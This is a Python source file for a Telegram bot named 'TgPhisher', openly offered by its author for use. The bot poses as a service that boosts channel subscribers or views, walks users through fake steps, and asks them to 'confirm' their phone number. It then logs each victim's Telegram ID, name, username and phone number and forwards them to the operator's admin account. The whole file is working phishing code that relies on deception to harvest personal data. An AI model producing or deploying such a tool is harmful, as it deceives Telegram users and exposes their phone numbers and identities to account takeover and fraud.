import telebot
from telebot import types
import colorama
from colorama import Fore, Style, Back, init
import os
import sys
import re
import requests
init()

########################
red = Fore.RED         
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN
yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT
########################
def print_user_data(user_id, first_name, username=None, phone_number=None):
    border = "{:-^40}".format("")
    
    print(Fore.YELLOW + border + Style.RESET_ALL)
    print(Fore.GREEN + "    ID: " + Fore.WHITE + "{:<31}".format(user_id) + Style.RESET_ALL)
    print(Fore.GREEN + "    –ò–º—è: " + Fore.WHITE + "{:<29}".format(first_name) + Style.RESET_ALL)
    
    if username:
        print(Fore.GREEN + "    Username: " + Fore.WHITE + "{:<24}".format("@" + username) + Style.RESET_ALL)
    if phone_number:
        print(Fore.GREEN + "    –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: " + Fore.WHITE + "     {:<14}".format(phone_number) + Style.RESET_ALL)
    print(Fore.YELLOW + border + Style.RESET_ALL)

os.system('cls' if os.name == 'nt' else 'clear')
print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
          .:–ù–∞–∫—Ä—É—Ç–∫–∞ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤/–ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CyberStalker1337
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')
def is_valid_token(token):

    try:
        bot = telebot.TeleBot(token)
        bot_info = bot.get_me()
        if bot_info:
            return True
    except telebot.apihelper.ApiException:
        return False

token = input(f"     {blue}–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞ >> ")
admin_id = input(f"     {blue}–í–≤–µ–¥–∏—Ç–µ –≤–∞—à —Ç–µ–ª–µ–≥—Ä–∞–º –∞–π–¥–∏ >> ")

if not is_valid_token(token):
    print("{reset}     –ù–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞")
    sys.exit

else:
    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –∑–∞–ø—Ä–æ—Å —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    username = get_bot_username(token)
    if username:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
          .:–ù–∞–∫—Ä—É—Ç–∫–∞ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤/–ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CYB3R_ST4LK3R
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')
        print(f"        –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!{reset} - {red}–¥–ª—è –≤—ã—Ö–æ–¥–∞ [ctrl + c]{reset}\n        –Æ–∑–µ—Ä–Ω–µ–π–º –≤–∞—à–µ–≥–æ –±–æ—Ç–∞: {yellow}@{username}{reset}\n        –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞\n        –ö–æ–º–∞–Ω–¥—É {yellow}- /start{reset} –±–æ—Ç—É.")

bot = telebot.TeleBot(token)

# –°–ª–æ–≤–∞—Ä–∏ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
user_states = {}
user_channels = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_states[message.chat.id] = "START"
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å", callback_data="continue")
    markup.add(button)
    bot.send_message(message.chat.id, "–ü—Ä–∏–≤–µ—Ç! üëã\n\n–î–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å –ø–æ–º–æ–∂–µ—Ç –≤–∞–º —É–≤–µ–ª–∏—á–∏—Ç—å –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –∏ –ø—Ä–æ—Å–º–æ—Ç—Ä—ã –≤–∞—à–µ–≥–æ –∫–∞–Ω–∞–ª–∞. –î–∞–≤–∞–π—Ç–µ –Ω–∞—á–Ω–µ–º! ‚ú®", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "continue")
def handle_continue(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    user_states[call.message.chat.id] = "AWAITING_CHANNEL"
    bot.send_message(call.message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –ø—É–±–ª–∏—á–Ω—É—é —Å—Å—ã–ª–∫—É –≤–∞—à–µ–≥–æ –∫–∞–Ω–∞–ª–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ @username.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHANNEL")
def process_channel_step(message):
    channel_username = message.text
    if not re.match(r'^@([a-zA-Z0-9_]{5,32})$', channel_username):
        bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–µ –∏–º—è –∫–∞–Ω–∞–ª–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ @username.")
        return

    user_channels[message.chat.id] = channel_username
    markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
    button1 = types.KeyboardButton("500 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤")
    button2 = types.KeyboardButton("500 –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤")
    markup.add(button1, button2)
    user_states[message.chat.id] = "AWAITING_CHOICE"
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –∏–ª–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤:", reply_markup=markup)

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHOICE")
def process_choice_step(message):
    if message.text not in ["500 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤", "500 –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤"]:
        bot.send_message(message.chat.id, "–î–ª—è –ø—Ä–∏–æ–±—Ä–µ—Ç–µ–Ω–∏—è –±–æ–ª—å—à–µ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω—É.")
        return

    markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
    button = types.KeyboardButton("–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", request_contact=True)
    markup.add(button)
    user_states[message.chat.id] = "AWAITING_PHONE_CONFIRM"
    bot.send_message(message.chat.id, "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if user_states.get(message.chat.id) != "AWAITING_PHONE_CONFIRM":
        return
    print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
    print()
    try:
        bot.send_message(admin_id, f'''
#TgPhisher - {username}

- {message.from_user.id}
- {message.from_user.first_name}
- {message.from_user.username}
- {message.contact.phone_number}
- By @CyberStalker1337''')
    except:
        print('     error send to ADMIN_ID      ')
    
    bot.send_message(message.chat.id, f"<b>–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω</b>–í–∞—à –∑–∞–ø—Ä–æ—Å –±—É–¥–µ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–Ω –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.\n–í–∞—à id:{message.from_user.id}", parse_mode='HTML')
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")